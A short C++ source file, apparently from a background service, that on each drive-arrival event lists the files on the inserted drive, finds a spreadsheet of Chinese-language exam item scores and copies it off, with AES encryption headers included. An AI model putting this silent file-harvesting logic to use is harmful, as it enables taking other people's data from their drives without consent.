#include "stdafx.h"
#include "Device.h"
#include <memory>
#include <list>
#include <fstream>
#include <iomanip>
#include <sstream>
#include <string>
#include "FileLister.h"
#include "AESKey.h"
#include "AESEncrypt.h"
#include <filesystem>
#include "Convert.h"
#include "FileSearcher.h"
#include "FileCopyer.h"
using namespace std;
using namespace filesystem;

bool IsServiceOn = true;

void DeviceArrivalMain(TCHAR DriveLetter) {
	Device dv(DriveLetter);
	Device::DiskInformation info = dv.GetDiskInformation();
	FileLister lister(dv);
	shared_ptr<list<FileData>> pls = lister.ListFile();
	FileSearcher fsr;
	shared_ptr<list<FileData>> psls = fsr.FindFile(pls, { L"语文（小题分）.xls" });
	FileCopyer cp(dv);
	cp.Copy(psls);
}

void DeviceRemovalMain(TCHAR DriveLetter) {

}